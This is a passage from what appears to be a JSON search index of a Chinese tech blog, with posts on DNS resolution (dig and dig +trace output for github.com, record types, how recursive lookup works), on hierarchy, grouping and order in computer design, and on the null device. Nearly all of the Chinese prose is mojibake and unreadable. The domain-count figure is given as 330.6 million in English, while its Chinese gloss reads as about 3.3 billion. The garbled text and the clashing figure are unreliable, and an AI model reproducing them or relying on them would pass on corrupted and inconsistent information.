"},"title":"network-dhcp"},"/blog/network-dns/":{"data":{"":" æ€æ ·å­¦ä¹ ä¸€ä¸ªæ–°çš„ä¸œè¥¿ï¼Œä¹Ÿå¯ä»¥æŒ‰ç…§ä¸€å®šçš„å¥—è·¯çš„ã€‚è¿™ä¸ªä¸œè¥¿è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿè¿™ä¸ªä¸œè¥¿æ€æ ·è§£å†³é—®é¢˜ï¼Ÿ è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ï¼Ÿ","dig-å‘½ä»¤#dig å‘½ä»¤":"dig domainname ~ dig github.com ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e github.com ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 23033 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;github.com. IN A ;; ANSWER SECTION: github.com. 17 IN A 52.74.223.119 # github.com. è¿™ä¸ªåŸŸåå¯¹åº”çš„ä¸€ä¸ª ip ;; Query time: 14 msec ;; SERVER: 61.139.2.69#53(61.139.2.69) ;; WHEN: Thu Apr 23 19:53:17 CST 2020 ;; MSG SIZE rcvd: 44 wireshark æŠ“åŒ…éªŒè¯å®é™…çš„ç½‘ç»œæ¶æ„ TCP/IP stack dig +trace domainname ~ dig +trace github.com ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e +trace github.com ;; global options: +cmd . 81219 IN NS k.root-servers.net. . 81219 IN NS e.root-servers.net. . 81219 IN NS b.root-servers.net. . 81219 IN NS a.root-servers.net. . 81219 IN NS m.root-servers.net. . 81219 IN NS l.root-servers.net. . 81219 IN NS d.root-servers.net. . 81219 IN NS f.root-servers.net. . 81219 IN NS g.root-servers.net. . 81219 IN NS h.root-servers.net. . 81219 IN NS j.root-servers.net. . 81219 IN NS c.root-servers.net. . 81219 IN NS i.root-servers.net. ;; Received 228 bytes from 61.139.2.69#53(61.139.2.69) in 15 ms #local dns serverï¼Œæœ¬åœ° DNS æ‹¥æœ‰å®Œæ•´çš„ root server ip åˆ—è¡¨ã€‚å†…ç½®åˆ°æœ¬åœ° DNS æœåŠ¡å™¨ã€‚ com. 172800 IN NS l.gtld-servers.net. # è®°å½• com. è¿™ä¸ªé¡¶çº§åŸŸåçš„æœåŠ¡å™¨ï¼Œgeneric top level domain server com. 172800 IN NS b.gtld-servers.net. com. 172800 IN NS c.gtld-servers.net. com. 172800 IN NS d.gtld-servers.net. com. 172800 IN NS e.gtld-servers.net. com. 172800 IN NS f.gtld-servers.net. com. 172800 IN NS g.gtld-servers.net. com. 172800 IN NS a.gtld-servers.net. com. 172800 IN NS h.gtld-servers.net. com. 172800 IN NS i.gtld-servers.net. com. 172800 IN NS j.gtld-servers.net. com. 172800 IN NS k.gtld-servers.net. com. 172800 IN NS m.gtld-servers.net. com. 86400 IN DS 30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766 com. 86400 IN RRSIG DS 8 1 86400 20200506050000 20200423040000 48903 . Enqd4bffSJHlv8mqHcAptS9+fHo3cg6vCIQgrOZ3aBfx2nG4CjS27iEG 6u6NsPfcKVrz7RoU2xDtDMNJOcMBJdJe/lGNeo14N69SM0/MV2Z8wZBD HRPd2Y8Z1nyc7EnDbkFzuWV5G6vafaQa4KTQpG6jGOPIQpYESNiinxfy 0QQWUJELvjSOideCPqQcug2P2Pln7BzWiqFSg6I8d1h44349LsXcbr5W zJwZQJKLoDd0ysyGl5Bq3UZgfWYvTJFmmZ/OwKYT4QQ4BE0MtbVwae8X 9yI6d9jENsz+eebEEtxLt6o/LNQb3PdNhUH1PC1pxfHiEiNyYUcvbJdf Flgntg== ;; Received 1170 bytes from 192.203.230.10#53(e.root-servers.net) in 211 ms # ä» e.root-servers.net è¿™ä¸ª root server æŸ¥è¯¢åˆ°çš„ TLD nameseverï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨ com. è¿™ä¸ªé¡¶çº§åŸŸåçš„æœåŠ¡å™¨ã€‚ github.com. 172800 IN NS ns1.p16.dynect.net. # è®°å½• github.com. è¿™ä¸ªåŸŸåçš„æƒå¨æœåŠ¡å™¨ github.com. 172800 IN NS ns3.p16.dynect.net. github.com. 172800 IN NS ns2.p16.dynect.net. github.com. 172800 IN NS ns4.p16.dynect.net. github.com. 172800 IN NS ns-520.awsdns-01.net. github.com. 172800 IN NS ns-421.awsdns-52.com. github.com. 172800 IN NS ns-1707.awsdns-21.co.uk. github.com. 172800 IN NS ns-1283.awsdns-32.org. CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q1GIN43N1ARRC9OSM6QPQR81H5M9A NS SOA RRSIG DNSKEY NSEC3PARAM CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20200427045033 20200420034033 39844 com. BDAWMm4AsSRfrBwOXhNN8ihw++J2UkhEk8A6LeSIz1llDs5kt0CcOqTM OK1txlQNr3N0k1RTBW/hkEZ1mxjIHF2GARt/hpO43ILPBVs/vhKAKCKh A96XJG+NzN0t/heB6mFNASKAcmVdfT5a0tVkmmzhGktDp5ECdZAIFRhZ 8y6jxsUhGP7ZiN1AfFBi1cWeSth5FW4Btpy9RffVKg5lIA== 4KB4DFS71LEP8G8P8VT4CCUSQNL4CNCS.com. 86400 IN NSEC3 1 1 0 - 4KB4PTQQ5CTA7POCTGM7RUFC8B1RKTEU NS DS RRSIG 4KB4DFS71LEP8G8P8VT4CCUSQNL4CNCS.com. 86400 IN RRSIG NSEC3 8 2 86400 20200428061912 20200421050912 39844 com. PFN1p6XvR4SmD4ucRULmtYIMQkFf/ZrdEWz6bRVtcepYF6QwTC/VOVYM 7PV0tuTTdr1LqkUwQJ7mv23vtKnjFba2Cf7pBOTz9JuCHUC0Qml9cOc6 Cwjhx7haj6h0VEzS+oIY7l2p/af/B36iQCXASVN3Y6s/i+66iXIg905z GqFnAKOgR0R4KJx5KwHIzBkgxr/I/SyCd+HNw+2fr15X0w== ;; Received 824 bytes from 192.26.92.30#53(c.gtld-servers.net) in 173 ms # ä» c.gtld-servers.net è¿™ä¸ª TLD nameserver æŸ¥è¯¢åˆ°å­˜å‚¨ github.com. è¿™ä¸ªåŸŸåçš„æƒå¨æœåŠ¡å™¨ã€‚ github.com. 60 IN A 13.250.177.223 # å¾—åˆ°äº† github.com. è¿™ä¸ªåŸŸåçš„ä¸€ä¸ª ip github.com. 900 IN NS ns-1707.awsdns-21.co.uk. github.com. 900 IN NS ns3.p16.dynect.net. github.com. 900 IN NS ns2.p16.dynect.net. github.com. 900 IN NS ns-1283.awsdns-32.org. github.com. 900 IN NS ns-421.awsdns-52.com. github.com. 900 IN NS ns-520.awsdns-01.net. github.com. 900 IN NS ns4.p16.dynect.net. github.com. 900 IN NS ns1.p16.dynect.net. ;; Received 275 bytes from 204.13.250.16#53(ns2.p16.dynect.net) in 198 ms ä» ns2.p16.dynect.net è¿™ä¸ªæƒå¨æœåŠ¡å™¨æŸ¥è¯¢åˆ°çš„ github.com. çš„ ip æ˜¯ 13.250.177.223ã€‚è‡³æ­¤ï¼Œå¾—åˆ°åŸŸåå¯¹åº”çš„ ipã€‚ ","dns-è®°å½•ç±»å‹#DNS è®°å½•ç±»å‹":"CNAME Canonical Name åŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåã€‚è§ä¸‹å›¾ï¼š\ndig -t cname music.163.com ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e -t cname music.163.com ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 12400 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;music.163.com.\tIN\tCNAME ;; ANSWER SECTION: music.163.com.\t1\tIN\tCNAME\tmusic.ntes53.netease.com. ;; Query time: 0 msec ;; SERVER: 198.18.0.2#53(198.18.0.2) ;; WHEN: Fri Oct 06 11:41:17 CST 2023 ;; MSG SIZE rcvd: 82 A address ip address\nNS name server ä¿å­˜ä¸‹ä¸€çº§åŸŸåçš„æœåŠ¡å™¨ï¼Œåªè®¾ç½®æˆåŸŸåã€‚\nPTR pointer recordï¼Œæ ¹æ® ip æŸ¥è¯¢åŸŸåã€‚ç±»ä¼¼ ARPï¼Œç”¨ ip æ‰¾ MAC åœ°å€ã€‚\nMX mail exchange ç”µå­é‚®ä»¶æœåŠ¡å™¨\nTXT å¯ä»¥è·å–è¿™ä¸ªç½‘ç«™åœ¨ä½¿ç”¨é‚£äº›ç¬¬ä¸‰æ–¹æœåŠ¡","reference#Reference":" DNS å…¥é—¨ Introduction and Layered Network Architecture root servers ips all-root-servers rfc-dns dns-server-types what is dns what is recursive dns dns record types ascii dns-zone zone-file viewdns dns record txt https://www.nslookup.io/ åŸŸåä¿¡æ¯æŸ¥è¯¢ dnså»¶è¿Ÿæµ‹è¯• dnså®è·µ dns-client-dog dns-client-doggo dnsé€Ÿåº¦æµ‹è¯• ","ä¸‰æ­¥èµ°åˆ†æä¸€ä¸‹-dns#ä¸‰æ­¥èµ°åˆ†æä¸€ä¸‹ DNS":"è§£å†³ä»€ä¹ˆé—®é¢˜ æ ¹æ®åŸŸåæ‰¾åˆ° IPã€‚ä¸ºå•¥è¦æ‰¾åˆ°åŸŸåå¯¹åº”çš„ IP å‘¢ï¼Ÿç­”æ¡ˆå¾ˆç®€å•ï¼Œå› ä¸º TCP/IP åè®®æ ˆéœ€è¦ã€‚ å¾ˆå¸¸è§çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æµè§ˆå™¨å¾—åˆ°ä¸€ä¸ª web page çš„æµç¨‹æ˜¯å•¥æ ·çš„ã€‚\nä»€ä¹ˆæ–¹å¼è§£å†³é—®é¢˜ æ€æ ·ç»„ç»‡åŸŸå(domain name)ï¼Ÿè¿™æ˜¯åŸŸåç³»ç»Ÿçš„é¦–è¦é—®é¢˜ã€‚åº•å±‚çš„ç»„ç»‡æ¶æ„ï¼Œå†³å®šäº†åŸŸåè§£æçš„æµç¨‹ã€‚æœ‰ç‚¹ç»æµåŸºç¡€å†³å®šä¸Šå±‚å»ºç­‘çš„æ„æ€ã€‚åŸŸåå°‘çš„æ—¶å€™å¯ä»¥ç›´æ¥æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚å¯¹ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨ç±» unix ç³»ç»Ÿé‡Œå°±æ˜¯ /etc/hosts çš„æ–‡ä»¶ã€‚ä½†æ˜¯åŸŸåè¶…çº§å¤šæ€ä¹ˆåŠï¼Ÿåˆ†ç±»ã€ç»„æˆå±‚æ¬¡ç»“æ„ã€‚å°±åƒ Linux çš„æ–‡ä»¶ç³»ç»Ÿçš„ç»„ç»‡æ–¹å¼ä¸€æ ·ã€‚ç»„ç»‡æˆä¸€ä¸ªæ ‘çŠ¶ç»“æ„ã€‚DNS çš„æŸ¥è¯¢é—®é¢˜ï¼Œé‚£å°±å¯ä»¥è§†ä¸ºæ ‘çš„éå†é—®é¢˜ã€‚\ntop level domain comã€orgã€ cn ç­‰ç­‰å°±æ˜¯æ‰€è°“çš„é¡¶çº§åŸŸåã€‚ä¹Ÿå°±æ˜¯ä¸€çº§åŸŸåã€‚é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œè¿™äº›é¡¶çº§åŸŸåå­˜æ”¾åœ¨å“ªå‘¢ï¼Ÿå­˜æ”¾åˆ° root serverã€‚æ¢ä¸€ç§ç†è§£æ–¹æ³•å°±æ˜¯ï¼Œè¿™äº› root server å°±æ˜¯é¡¶çº§åŸŸåçš„ metadataã€‚è¿™äº› root server IP æ˜¯å›ºå®šçš„ã€‚å®ç° DNS è¿™ä¸ªåŠŸèƒ½çš„è½¯ä»¶å†…ç½®è¿™äº› root server çš„ ipã€‚è¿™ä¸€ç‚¹å¾ˆé‡è¦ã€‚\nrpm -ql bind | grep named.ca /usr/share/doc/bind-9.11.4/sample/var/named/named.ca /var/named/named.ca centos ä¸Šå®‰è£… bind9 è¿™ä¸ªæ–‡ä»¶åŒ…å«æ‰€æœ‰çš„ root servers çš„ ip\nsecond level domain ä»¥ www.google.com. ä¸ºä¾‹ google å°±æ˜¯äºŒçº§åŸŸåã€‚å…¶ä»–çš„ä¾æ­¤ç±»æ¨ã€‚\nDNS å±‚çº§æ ‘ å¯ä»¥çœ‹åˆ°æ•´ä¸ª DNS çš„å…¥å£å°±æ˜¯ rootã€‚ä¹Ÿå°±æ˜¯è®°å½•é¡¶çº§åŸŸååœ¨å“ªäº›æœåŠ¡å™¨ä¸Šçš„ä¿¡æ¯ã€‚è¿™æ˜¯ root ä¹Ÿå°±æ˜¯ä¸éœ€è¦è§£æè¿™äº›è®°å½•é¡¶çº§åŸŸåçš„æœåŠ¡å™¨ã€‚ç›´æ¥å›ºå®šäº†è¿™äº› root server çš„ IP åœ°å€ã€‚å®ç° DNS åŠŸèƒ½çš„è½¯ä»¶ï¼Œç›´æ¥å†…ç½®è¿™äº›å›ºå®šçš„ IPã€‚DNS æŸ¥è¯¢ç¬¬ä¸€æ­¥å°±æ˜¯å‘è¿™äº› root server æŸ¥è¯¢é¡¶çº§åŸŸåå¯¹åº”å“ªäº› nameserverï¼Œä¹Ÿå°±æ˜¯é¡¶çº§åŸŸåå¯¹åº”çš„ IPã€‚å…¶å® DNSä¹Ÿå°±æ˜¯ä¸ªåˆ†å¸ƒå¼å±‚çº§æ•°æ®åº“ã€‚æ³¨å†ŒåŸŸåä¹Ÿå°±æ˜¯å‘æ•°æ®åº“æ·»åŠ ä¸€æ¡è®°å½•ã€‚ä½†æ˜¯ä¸æ˜¯å…è´¹æ³¨å†Œçš„ã€‚\nDNS Zone å¯ä»¥çœ‹åˆ°æ•´ä¸ª DNS å±‚çº§æ ‘ï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹å¯¹åº”ä¸€ä¸ª Zoneã€‚\nuncached DNS lookup å›¾ä¸­ OS stub resovler å°±æ˜¯è´Ÿè´£ DNS è§£æçš„è¿›ç¨‹ï¼Œå‘èµ· DNS é€’å½’æŸ¥è¯¢è¯·æ±‚ã€‚ local dns server å‘èµ·è¿­ä»£æŸ¥è¯¢ï¼ŒæŸ¥è¯¢åŸŸåå¯¹åº”çš„ IPã€‚ä¹‹åè¿”ç»™ OS stub resovler(name servers that provide the complete answers to user queries)ã€‚\nè¿™ä¸ªè¿›ç¨‹å‘ local dns server å‘èµ·é€’å½’æŸ¥è¯¢ã€‚ä¹Ÿå°±æ˜¯åªéœ€è¦ç­‰ local dns server æŸ¥è¯¢ç»“æœå°±è¡Œã€‚ local dns server å‘èµ·è¿­ä»£æŸ¥è¯¢ã€‚å› ä¸º local dns server æœ‰æ‰€æœ‰ root server çš„ IPï¼Œé€‰æ‹©ä¸€ä¸ª IPï¼Œæ ¹æ®é¡¶çº§åŸŸåå±äºå“ªä¸€ä¸ª TLD Zoneï¼Œ å‘èµ·è¿­ä»£æŸ¥è¯¢ã€‚ å¯ä»¥æŸ¥è¯¢å¾—åˆ°è®°å½•è¿™ä¸ªé¡¶çº§åŸŸåçš„ TLD server æœ‰å“ªäº›ï¼Œä»¥åŠè¿™äº›æœåŠ¡å™¨çš„ IPã€‚ local dns server é€‰æ‹©ä¸€ä¸ª TLD serverï¼Œå‘èµ·è¿­ä»£æŸ¥è¯¢ã€‚ å¾—åˆ°è¿™ä¸ªåŸŸåçš„æƒå¨æœåŠ¡å™¨ã€‚ é€‰æ‹©ä¸€ä¸ªæƒå¨æœåŠ¡å™¨ï¼Œå‘èµ·è¿­ä»£æŸ¥è¯¢ï¼ŒæŸ¥è¯¢åŸŸåå¯¹åº”çš„ IPã€‚ local dns server ä»æƒå¨æœåŠ¡å™¨å¾—åˆ°åŸŸåå¯¹åº”çš„ IPã€‚ è¿”è¿˜ç»™ OS stub resovlerã€‚é€’å½’æŸ¥è¯¢ç»“æŸã€‚ Systems normally lookup any name (including domain names) using the hosts file first (if present), followed by DNS. However, the nsswitch.conf file (typically in /etc) controls this order (normally hosts: file dns), allowing the order to be changed or the file value to be deleted entirely depending on local needs.\næœ‰æ²¡æœ‰å…¶ä»–è§£å†³æ–¹æ¡ˆ "},"title":"network-dns"},"/blog/notions-of-computer/":{"data":{"":"","references#References":" memory-hierarchy what-is-a-domain-name dns-root-server ip number resources The Internet Numbers Registry System Filesystem_Hierarchy_Standard Filesystem Hierarchy Standard List network-layer internet-protocol what-is-a-computer-port open-systems-interconnection-model CSE141-Caching ","æŒ‡å¯¼æ€æƒ³#æŒ‡å¯¼æ€æƒ³":"è®¡ç®—æœºæ˜¯äººå‘æ˜çš„ã€‚ç”±è®¡ç®—æœºç»„æˆçš„ä¸–ç•Œï¼Œå…¶è®¾è®¡æ€æƒ³å¾ˆæ˜æ˜¾è¦å€Ÿé‰´ç°å®ä¸­çš„ä¸œè¥¿ã€‚æ­£å¦‚ä¸€ä½ä¼Ÿäººçš„è‘—ä½œå¼€ç¯‡æå‡º â€œè°æ˜¯æˆ‘ä»¬çš„æ•Œäººï¼Ÿè°æ˜¯æˆ‘ä»¬çš„æœ‹å‹ï¼Ÿè¿™ä¸ªé—®é¢˜æ˜¯é©å‘½çš„é¦–è¦é—®é¢˜ã€‚ä¸­å›½è¿‡å»ä¸€åˆ‡é©å‘½æ–—äº‰æˆæ•ˆç”šå°‘ï¼Œå…¶åŸºæœ¬åŸå› å°±æ˜¯å› ä¸ºä¸èƒ½å›¢ç»“çœŸæ­£çš„æœ‹å‹ï¼Œä»¥æ”»å‡»çœŸæ­£çš„æ•Œäººã€‚â€é‚£ä¹ˆåº”å¯¹è®¡ç®—æœºï¼Œä»€ä¹ˆæ‰æ˜¯è®¡ç®—æœºç»„ç»‡èƒŒåçš„æŒ‡å¯¼æ€æƒ³å‘¢ï¼Ÿä¸ªäººè®¤ä¸ºæœ‰ä¸‰ä¸ªï¼š1. hierarchy(å±‚çº§)ã€2ï¼šgroup(åˆ†ç»„)ã€3ï¼šorder(æœ‰åº)\nhierarchy(å±‚çº§) hierarchy åœ¨è¿™é‡Œä¹Ÿå¯ä»¥ç†è§£æˆç­‰çº§ã€‚å±‚çº§ç»“æ„æœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯æœ€é¡¶å±‚åœ¨å“ªï¼Ÿç”¨ tree ç†è§£å°±æ˜¯ï¼Œroot åœ¨å“ªï¼Ÿè¿™ä¸ªä¿¡æ¯æ•´ä¸ªå±‚çº§éƒ½è¦çŸ¥é“ã€‚å“ˆå“ˆï¼Œæ˜¯ä¸æ˜¯æŒºåƒçš‡å¸ã€‚ğŸ˜„\né¢å¯¹æ•°é‡åºå¤§çš„ç›¸åŒäº‹ç‰©ï¼Œæ€æ ·ç®¡ç†å‘¢ï¼Ÿç”¨ä»€ä¹ˆç»„ç»‡æ–¹å¼å‘¢ï¼Ÿ è¿™é‡Œçš„æ•°é‡åºå¤§è¦æ˜¯æˆåƒä¸Šä¸‡çš„ã€‚æ¯”å¦‚ä¸­å›½æœ‰åå‡ äº¿äººå£ã€ä¸­å›½æœ‰ 960 ä¸‡å¹³æ–¹å…¬é‡Œçš„åœŸåœ°ï¼Œç­‰ç­‰ã€‚é¦–å…ˆç®€è¿°ä¸€ä¸‹å†å²ä¸Šçš„ç»éªŒï¼Œæ¯”å¦‚è¥¿å‘¨ï¼Œé‡‡ç”¨åˆ†å°åˆ¶ã€‚å¤©å­ã€è¯¸ä¾¯ã€å¿ã€å£«ã€å¹³æ°‘ç­‰æ‰€æœ‰äººç»„æˆä¸€ä¸ªé‡‘å­—å¡”å½¢çŠ¶ã€‚æ¯ä¸€ä¸ªå±‚çº§çš„äººæƒåŠ›å¤§å°ä¸åŒã€æ‰¿æ‹…çš„è´£ä»»å’Œä¹‰åŠ¡ä¹Ÿä¸åŒã€‚å¯¹äºåœŸåœ°åˆ™æ˜¯å°é‚¦å»ºå›½ã€‚åˆ†å°åˆ¶å¯ä»¥å¯¹äººå£ã€åœŸåœ°ç­‰è¿›è¡Œæœ‰æ•ˆçš„ç»Ÿæ²»ã€‚æ›´ç›´è§‚çš„ç†è§£å°±æ˜¯å½¢æˆç¨³å®šçš„é˜¶çº§ã€‚åˆ°è¿™æ˜¯ä¸æ˜¯ç«‹åˆ»å°±èƒ½æƒ³åˆ°ç”±äºæ¯ç§å­˜å‚¨çš„ä»·æ ¼ã€é€Ÿåº¦ã€å®¹é‡ä¸åŒï¼Œåº”ç”¨åœ¨å“ªä¸ªåœ°æ–¹ä¹Ÿä¸åŒã€‚ä¹Ÿæ˜¯ç»„ç»‡æˆä¸€ä¸ªå±‚çº§ç»“æ„æ¥æ„æˆæ•´ä¸ªè®¡ç®—æœºçš„å­˜å‚¨ç³»ç»Ÿã€‚\nä»æ•°å­¦çš„è§’åº¦åˆ†æå°±æ˜¯ï¼šç”¨å¯¹æ•°çš„æ–¹å¼æå®šæ•°é‡åºå¤§çš„äº‹ç‰©çš„ç®¡ç†ã€‚ä¸ç®¡æ•°é‡å¤šåºå¤§ï¼Œç”¨å¯¹æ•°æä¸€ä¸‹ï¼Œæ•°é‡ç«‹åˆ»å°±é™ä¸‹æ¥ã€‚æ¯”å¦‚ log24294967296 = 32ã€‚å¯¹æ•°çš„å‘æ˜ã€è§£æå‡ ä½•çš„åˆ›ç«‹å’Œå¾®ç§¯åˆ†çš„å»ºç«‹æ˜¯17ä¸–çºªæ•°å­¦çš„ä¸‰å¤§æˆå°±ã€‚\nåŸŸåç»„ç»‡æ–¹å¼ In 2017, 330.6 million domain names had been registered. 2017 å¹´å·²ç»æœ‰ 33 å¤šäº¿çš„æ³¨å†ŒåŸŸåäº†ã€‚\nå¦‚æœè®©ä½ ç»„ç»‡æ•°é‡å¦‚æ­¤åºå¤§çš„åŸŸåï¼Œä½ è¯¥æ€æ ·ç»„ç»‡å‘¢ï¼Ÿæ²¡é”™ï¼Œä¹Ÿæ˜¯ç»„ç»‡æˆå±‚çº§ç»“æ„ï¼Œæ¥ç®¡ç†æ•°é‡å¦‚æ­¤åºå¤§çš„åŸŸåã€‚ä¸€å¼€å§‹çš„è§£å†³æ–¹æ³•æ˜¯ç›´æ¥æŠŠåŸŸåä¿¡æ¯æ”¾åœ¨ /etc/hosts æ–‡ä»¶ï¼Œéšç€åŸŸåå¢å¤šï¼Œå•ç‹¬çš„ä¸€ä¸ªæ–‡ä»¶æ²¡æ³•æ»¡è¶³è¦æ±‚ï¼Œæ•°é‡å¤ªå¤šäº†å˜›ï¼Œæ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸”ä¸è®ºèƒ½ä¸èƒ½å…¨éƒ¨å­˜å‚¨ï¼ŒæŸ¥æ‰¾éƒ½æ˜¯ä¸€ä¸ªå¤§é—®é¢˜ã€‚\nIP åˆ†é…ç®¡ç†æ–¹å¼ IP Addresses are unique identifiers used to determine who is who on the Internet. IP åœ°å€æ˜¯ä¸€ä¸ª 32bit çš„æ— ç¬¦å·æ•´æ•°ã€‚èŒƒå›´æ˜¯ [0,2^32-1], ä¸€å…±æœ‰ 4294967296 ä¸ªæ•´æ•°ã€‚å°†è¿‘ 43 äº¿ä¸ª ip åœ°å€(è¿™é‡Œä¸è€ƒè™‘å…¬ç½‘ã€ç§ç½‘)è¯¥æ€æ ·åˆ†é…ä½¿ç”¨å‘¢ï¼Ÿç”± Internet Assigned Numbers Authority (IANA) è´Ÿè´£åè°ƒç®¡ç†æ‰€æœ‰ IPï¼ŒåŒæ—¶è´Ÿè´£åˆ†é…è‡ªæ²»ç³»ç»Ÿå·(Autonomous System number)ã€‚\nBoth IPv4 and IPv6 addresses are generally assigned in a hierarchical manner. Users are assigned IP addresses by Internet service providers (ISPs). ISPs obtain allocations of IP addresses from a local Internet registry (LIR) or National Internet Registry (NIR), or from their appropriate Regional Internet Registry (RIR):\næ•°é‡åºå¤§çš„ IP åœ°å€æ€æ ·åˆ†é…ç®¡ç†å‘¢ï¼Ÿç»„æˆå±‚çº§ç»“æ„ã€‚é€šè¿‡ä¸€çº§ä¸€çº§å§”æ‰˜ï¼Œç®¡ç†æ•°é‡åºå¤§çš„ IP åœ°å€ã€‚\næ–‡ä»¶ç»„ç»‡æ–¹å¼ ä¸åŒæ€§è´¨çš„äº‹ç‰©ï¼Œæ€æ ·ç»„ç»‡å‘¢ï¼Ÿ memory hierarchy Typical memory hierarchy OSI å‚è€ƒæ¨¡å‹ ç½‘ç»œæ¯ä¸€å±‚ï¼ŒåŠŸèƒ½ä¸åŒã€‚\ngroup(åˆ†ç»„) ä½“é‡åºå¤§çš„ä¸œè¥¿çš„åŸºå±‚ç»„ç»‡ã€‚\nå¯è§†ä¸ºå±‚çº§ç»“æ„çš„æœ€åº•å±‚ã€‚blockã€pageã€packetã€fragmentã€set ä¹Ÿå¯ä»¥è§†ä¸ºä¸åŒçš„æ¨¡å—ã€‚moduleã€segmentã€section ä¹Ÿå¯ä»¥ç†è§£æˆåˆ†ç±»ã€‚sort åŸŸå å¯¹åŸŸåæ¥è¯´ä¸€ä¸ªåˆ†ç»„å¯ä»¥ç†è§£æˆä¸€ä¸ªä¸€çº§åŸŸåä¸‹çš„æ‰€æœ‰åŸŸåã€‚å¦‚ orgä¸‹çš„åŸŸåã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç†è§£æˆä¸€ä¸ª äºŒçº§åŸŸåä¸‹çš„æ‰€æœ‰åŸŸåã€‚å¦‚ google.com ä¸‹ Google å®¶æ‰€æœ‰çš„åŸŸåã€‚ä¾æ¬¡ç±»æ¨ã€‚å¯ä»¥çœ‹å‡ºï¼ŒåŒç§äº‹ç‰©è¿›è¡Œå±‚çº§ç»„ç»‡ï¼Œæœ¬èº«å°±æ˜¯åœ¨è¿›è¡Œåˆ†ç»„ã€‚\nIP åœ°å€ An autonomous system (AS) is a very large network or group of networks with a single routing policy. Each AS is assigned a unique ASN, which is a number that identifies the AS.\næ²¡é”™ã€‚IP åœ°å€ä¹Ÿæ˜¯é€šè¿‡ä¸€ä¸ªä¸€ä¸ªçš„å®ä½“æ¥ç®¡ç†ä½¿ç”¨çš„ï¼Œä¸€ä¸ªå®ä½“å°±æ˜¯ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿã€‚(autonomous system)ã€‚æ¯”å¦‚ä¸­å›½ç§»åŠ¨è¿™ä¸ªè¿è¥å•†çš„ AS Number æ˜¯ 56041ï¼Œç®¡ç†ä¸€ç³»åˆ— IP åœ°å€ã€‚å†æ¯”å¦‚ Apple çš„ AS Number æ˜¯ 714ã€‚\nInternet Protocol Data traversing the Internet is divided into smaller pieces, called packets. IP information is attached to each packet, and this information helps routers to send packets to the right place.\né€šè¿‡ç½‘ç»œå‘é€å¤§é‡çš„ä¿¡æ¯ï¼Œä¹Ÿæ˜¯æ‹†åˆ†æˆä¸€ä¸ªä¸ª packetã€‚è¿™é‡Œä¹Ÿå¯ä»¥ç†è§£æˆåˆ†ç»„ã€‚\næ–‡ä»¶ç³»ç»Ÿ æ–‡ä»¶ç³»ç»Ÿç®¡ç†ç£ç›˜ç©ºé—´ã€‚ç£ç›˜ç©ºé—´åˆ’åˆ†ä¸ºä¸€ä¸ªä¸ªç›¸åŒå¤§å°çš„ Blockã€‚ä¸€ä¸ªæ‰‡åŒºæ˜¯ 512Bytesï¼Œè¿™å¯ä»¥è§†ä¸ºä¸€ä¸ªåˆ†ç»„ã€‚\nç½‘ç»œæµé‡ Ports are virtual places within an operating system where network connections start and end. They help computers sort the network traffic they receive.\nè®¡ç®—æœºä»ç½‘ç»œä¸Šæ¥æ”¶çš„ packet æ€æ ·åˆ¤å®šå“ªä¸€ä¸ªæ˜¯æ¥æ”¶è€…å‘¢ï¼Ÿå¯¹ç½‘ç»œæµé‡åˆ†ç±»å°±è¡Œã€‚æ€æ ·åˆ†ç±»å‘¢ï¼Ÿç”¨ç«¯å£å·ï¼Œä¸åŒçš„æ¥æ”¶è€…ï¼Œæ¥æ”¶ä¸åŒç«¯å£çš„æµé‡ã€‚\nsubnet Think of the Internet as a network of networks: computers are connected to each other within networks, and these networks connect to other networks. This enables these computers to connect with other computers both near and far. A network is a group of two or more connected computing devices.\nåˆ’åˆ†å­ç½‘ï¼Œä¹Ÿæ˜¯åœ¨åˆ†ç»„ã€‚\norder(é¡ºåº) é¡ºåºã€åˆ†æ”¯ã€å¾ªç¯ã€‚é¡ºåºå°±æ˜¯ç¨‹åºä¸‰å¤§ç»“æ„ä¹‹ä¸€ã€‚æ²¡æœ‰ç§©åºçš„ä¸–ç•Œæ˜¯æ··ä¹±çš„ï¼Œå•¥äº‹ä¹Ÿåšä¸æˆã€‚ TCP åè®®ç›®çš„ä¹‹ä¸€å°±æ˜¯è¦ä¿è¯è®¡ç®—æœºæ¥æ”¶åˆ°çš„ç½‘ç»œåŒ…çš„é¡ºåºã€‚æ€æ ·ä¿è¯é¡ºåºå‘¢ï¼Ÿéå¸¸ç®€å•ï¼Œä¸ºæ¯ä¸€ä¸ª Byte ç¼–å·å°±è¡Œã€‚"},"title":"notions_of_computer"},"/blog/null-device/":{"data":{"null-device-æ˜¯å•¥#NULL device æ˜¯å•¥ï¼Ÿ":"NULL device æ˜¯å•¥ï¼ŸThe null device is a special file that discards all data written to it, but reports that the write operation succeeded.","references#References":" dev-null windows-NUL man7 /dev/null NUL in Windows seems to be actually a virtual path in any folder 